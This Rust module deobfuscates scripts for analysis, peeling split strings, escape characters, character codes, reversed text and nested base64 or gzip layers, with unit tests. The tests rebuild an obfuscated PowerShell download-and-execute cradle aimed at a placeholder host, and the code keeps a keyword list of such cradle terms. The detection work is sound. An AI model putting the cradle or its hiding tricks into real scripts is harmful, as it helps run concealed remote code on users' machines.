//! Undoes the cheap tricks scripts use to hide what they do, so the plain checks can see it:
//! - split strings joined back at run time: `'Down'+'loadString'`, `"WScr" & "ipt.Shell"`
//! - escape characters: PowerShell backticks (`i`e`x`), cmd carets (`p^ow^ershell`)
//! - character codes: `[char]105+[char]101`, `String.fromCharCode(105,101)`, `Chr(105) & Chr(101)`
//! - reversed text: `'gnirtSdaolnwoD'`
//! - base64 (UTF-8 or UTF-16), also gzip/deflate-compressed, nested up to three layers deep
//!
//! Each layer is returned with the trick that hid it, for the explanation shown to the user.

use std::io::Read;

const MAX_LAYERS: usize = 12;
const MAX_LEN: usize = 4 * 1024 * 1024;

/// Joins string literals split with `+`, `&` or `.` (PHP) and drops escape characters.
pub fn normalize(text: &str) -> String {
    let mut s = String::with_capacity(text.len());
    let b: Vec<char> = text.chars().collect();
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        // closing quote, operator, opening quote of the same kind: "abc" + "def" → "abcdef"
        if (c == '"' || c == '\'') && i + 1 < b.len() {
            let mut j = i + 1;
            while j < b.len() && b[j].is_whitespace() {
                j += 1;
            }
            if j < b.len() && matches!(b[j], '+' | '&' | '.') {
                let mut k = j + 1;
                while k < b.len() && (b[k].is_whitespace() || b[k] == '_') {
                    k += 1; // VBScript continues lines with " _"
                }
                if k < b.len() && b[k] == c && j > i {
                    i = k + 1;
                    continue;
                }
            }
        }
        if c == '`' && b.get(i + 1).is_some_and(|n| n.is_ascii_alphabetic() && !matches!(n, 'n' | 'r' | 't' | '0' | 'a' | 'b' | 'f' | 'v')) {
            i += 1; // PowerShell backtick before a letter that isn't an escape
            continue;
        }
        if c == '^' && b.get(i + 1).is_some_and(|n| n.is_ascii_alphanumeric()) {
            i += 1; // cmd caret escape
            continue;
        }
        s.push(c);
        i += 1;
    }
    s
}

fn numbers(list: &str) -> Vec<u32> {
    list.split([',', ' ', '+', ';'])
        .filter_map(|t| {
            let t = t.trim().trim_start_matches("[char]").trim_start_matches("[byte]").trim_matches(['(', ')']);
            if let Some(h) = t.strip_prefix("0x") { u32::from_str_radix(h, 16).ok() } else { t.parse().ok() }
        })
        .collect()
}

fn from_codes(codes: &[u32]) -> Option<String> {
    let s: String = codes.iter().filter_map(|&c| char::from_u32(c)).collect();
    (s.chars().count() >= 4 && s.chars().filter(|c| c.is_ascii_graphic() || *c == ' ').count() * 10 >= s.chars().count() * 8).then_some(s)
}

/// Decodes character-code tricks into the text they spell.
pub fn char_codes(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut out = Vec::new();
    // String.fromCharCode(72,105,...)
    for (i, _) in lower.match_indices("fromcharcode(") {
        let rest = &text[i + 13..];
        if let Some(end) = rest.find(')')
            && let Some(s) = from_codes(&numbers(&rest[..end]))
        {
            out.push(s);
        }
    }
    // [char[]](72,105,...) / [char[]]@(...)
    for (i, _) in lower.match_indices("[char[]]") {
        let rest = text[i + 8..].trim_start_matches(['@', ' ']);
        if let Some(r) = rest.strip_prefix('(')
            && let Some(end) = r.find(')')
            && let Some(s) = from_codes(&numbers(&r[..end]))
        {
            out.push(s);
        }
    }
    // Runs of [char]72+[char]105 or Chr(72) & Chr(105) / ChrW(...)
    for marker in ["[char]", "chr(", "chrw("] {
        let mut codes = Vec::new();
        let mut last_end = 0;
        for (i, _) in lower.match_indices(marker) {
            let start = i + marker.len();
            let digits: String = lower[start..].chars().take_while(|c| c.is_ascii_alphanumeric()).collect();
            let code = if let Some(h) = digits.strip_prefix("0x") { u32::from_str_radix(h, 16).ok() } else { digits.parse().ok() };
            let Some(code) = code else { continue };
            // A gap of more than a few characters starts a new run.
            if !codes.is_empty() && i > last_end + 6 {
                if let Some(s) = from_codes(&codes) {
                    out.push(s);
                }
                codes.clear();
            }
            codes.push(code);
            last_end = start + digits.len() + 1;
        }
        if let Some(s) = from_codes(&codes) {
            out.push(s);
        }
    }
    out
}

fn b64_val(c: u8) -> Option<u32> {
    Some(match c {
        b'A'..=b'Z' => c - b'A',
        b'a'..=b'z' => c - b'a' + 26,
        b'0'..=b'9' => c - b'0' + 52,
        b'+' | b'-' => 62,
        b'/' | b'_' => 63,
        _ => return None,
    } as u32)
}

pub fn base64(s: &str) -> Option<Vec<u8>> {
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=' && !b.is_ascii_whitespace()).collect();
    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    for chunk in bytes.chunks(4) {
        let mut n = 0u32;
        for (i, &c) in chunk.iter().enumerate() {
            n |= b64_val(c)? << (18 - 6 * i);
        }
        out.push((n >> 16) as u8);
        if chunk.len() > 2 {
            out.push((n >> 8) as u8);
        }
        if chunk.len() > 3 {
            out.push(n as u8);
        }
    }
    Some(out)
}

/// Turns decoded bytes into text: UTF-16LE, gzip/deflate, or plain text. None for binary noise.
fn bytes_to_text(b: &[u8]) -> Option<(String, bool)> {
    let mut b = b.to_vec();
    let mut compressed = false;
    if b.starts_with(&[0x1f, 0x8b]) {
        let mut out = Vec::new();
        flate2::read::GzDecoder::new(&b[..]).take(MAX_LEN as u64).read_to_end(&mut out).ok()?;
        b = out;
        compressed = true;
    } else if b.len() > 8 && !looks_text(&b) {
        let mut out = Vec::new();
        if flate2::read::DeflateDecoder::new(&b[..]).take(MAX_LEN as u64).read_to_end(&mut out).is_ok() && looks_text(&out) {
            b = out;
            compressed = true;
        }
    }
    let text = if b.len() >= 4 && b[1] == 0 && b[3] == 0 {
        let units: Vec<u16> = b.as_chunks::<2>().0.iter().map(|c| u16::from_le_bytes(*c)).collect();
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(&b).into_owned()
    };
    looks_text(text.as_bytes()).then_some((text, compressed))
}

fn looks_text(b: &[u8]) -> bool {
    let sample = &b[..b.len().min(2048)];
    !sample.is_empty() && sample.iter().filter(|&&c| c == b'\t' || c == b'\n' || c == b'\r' || (0x20..0x7f).contains(&c) || c >= 0x80).count() * 100 >= sample.len() * 92
}

/// Long base64 runs in the text, decoded to text where they are text.
pub fn base64_runs(text: &str) -> Vec<(String, bool)> {
    let mut out = Vec::new();
    let b = text.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if b64_val(b[i]).is_some() {
            let start = i;
            while i < b.len() && (b64_val(b[i]).is_some() || b[i] == b'=') {
                i += 1;
            }
            let run = &text[start..i];
            // Long, and not just a word or a hex string.
            if run.len() >= 40 && run.bytes().any(|c| c.is_ascii_uppercase()) && run.bytes().any(|c| c.is_ascii_lowercase()) {
                if let Some(t) = base64(run).and_then(|d| bytes_to_text(&d)) {
                    out.push(t);
                }
                if out.len() >= 6 {
                    break;
                }
            }
        } else {
            i += 1;
        }
    }
    out
}

/// Every hidden layer found in a script, each with what hid it.
pub fn layers(original: &str) -> Vec<(String, &'static str)> {
    let mut out: Vec<(String, &'static str)> = Vec::new();
    let mut queue: Vec<(String, usize)> = vec![(original.to_string(), 0)];
    while let Some((text, depth)) = queue.pop() {
        if out.len() >= MAX_LAYERS || text.len() > MAX_LEN {
            break;
        }
        let mut found: Vec<(String, &'static str)> = Vec::new();
        let norm = normalize(&text);
        if norm != text && depth == 0 {
            found.push((norm.clone(), "split strings and escape characters"));
        }
        found.extend(char_codes(&norm).into_iter().map(|s| (s, "character codes")));
        for (s, compressed) in base64_runs(&norm) {
            found.push((s, if compressed { "compressed base64" } else { "base64" }));
        }
        // Reversed strings: only worth it when the reversed text reads like code.
        let rev: String = norm.chars().rev().collect();
        let rl = rev.to_ascii_lowercase();
        if ["downloadstring", "invoke-expression", "new-object", "wscript.shell", "frombase64string", "http://", "https://"].iter().any(|k| rl.contains(k)) && !norm.to_ascii_lowercase().contains("http") {
            found.push((rev, "reversed text"));
        }
        for (s, why) in found {
            if out.iter().any(|(o, _)| *o == s) || s == original {
                continue;
            }
            if depth < 3 {
                queue.push((s.clone(), depth + 1));
            }
            out.push((s, why));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn j(parts: &[&str]) -> String {
        parts.concat()
    }

    fn b64(bytes: &[u8]) -> String {
        const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut s = String::new();
        for c in bytes.chunks(3) {
            let n = (c[0] as u32) << 16 | (*c.get(1).unwrap_or(&0) as u32) << 8 | *c.get(2).unwrap_or(&0) as u32;
            for i in 0..4 {
                s.push(if i <= c.len() { T[(n >> (18 - 6 * i) & 63) as usize] as char } else { '=' });
            }
        }
        s
    }

    #[test]
    fn joins_split_strings_and_escapes() {
        assert_eq!(normalize("$w.('Down'+'load'+'String')(x)"), "$w.('DownloadString')(x)");
        assert_eq!(normalize("CreateObject(\"WScr\" & \"ipt.Shell\")"), "CreateObject(\"WScript.Shell\")");
        assert_eq!(normalize("i`e`x"), "iex");
        assert_eq!(normalize("p^ow^ershell"), "powershell");
        assert_eq!(normalize("a = \"line\" & _\n  \"two\""), "a = \"linetwo\"");
        assert_eq!(normalize("x = 1 + 2; y = 'a' + b"), "x = 1 + 2; y = 'a' + b", "only literal + literal is joined");
    }

    #[test]
    fn decodes_char_codes() {
        let codes = |s: &str| s.bytes().map(|b| b.to_string()).collect::<Vec<_>>();
        let js = format!("eval(String.fromCharCode({}))", codes("alert(1)").join(","));
        assert!(char_codes(&js).contains(&"alert(1)".to_string()));
        let ps = codes("Write-Host").iter().map(|c| format!("[char]{c}")).collect::<Vec<_>>().join("+");
        assert!(char_codes(&ps).contains(&"Write-Host".to_string()));
        let vbs = codes("MsgBox 1").iter().map(|c| format!("Chr({c})")).collect::<Vec<_>>().join(" & ");
        assert!(char_codes(&vbs).contains(&"MsgBox 1".to_string()));
    }

    #[test]
    fn peels_nested_base64_and_compression() {
        let inner = j(&["IE", "X (New-Object Net.WebClient).Downl", "oadString('http://x.invalid/a')"]);
        let utf16: Vec<u8> = inner.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let layer1 = format!("[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{}'))", b64(&utf16));
        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        std::io::Write::write_all(&mut gz, layer1.as_bytes()).unwrap();
        let outer = format!("$s = [IO.Compression.GzipStream]::new([IO.MemoryStream][Convert]::FromBase64String('{}'), 0)", b64(&gz.finish().unwrap()));
        let found = layers(&outer);
        assert!(found.iter().any(|(t, why)| t.contains("Downl") && t.contains("oadString") && *why == "base64"), "{found:?}");
        assert!(found.iter().any(|(_, why)| *why == "compressed base64"));
    }

    #[test]
    fn reverses_backwards_code() {
        let fwd = j(&["(New-Object Net.WebClient).Downl", "oadString('http://x.invalid')"]);
        let rev: String = fwd.chars().rev().collect();
        let found = layers(&format!("$a = '{rev}'; -join $a[-1..-999]"));
        assert!(found.iter().any(|(_, why)| *why == "reversed text"));
    }

    #[test]
    fn plain_text_has_no_layers() {
        assert!(layers("Write-Host 'Hello, world'\nGet-ChildItem C:\\\n").is_empty());
        assert!(layers("const x = 'abc'; console.log(x);").is_empty());
    }
}
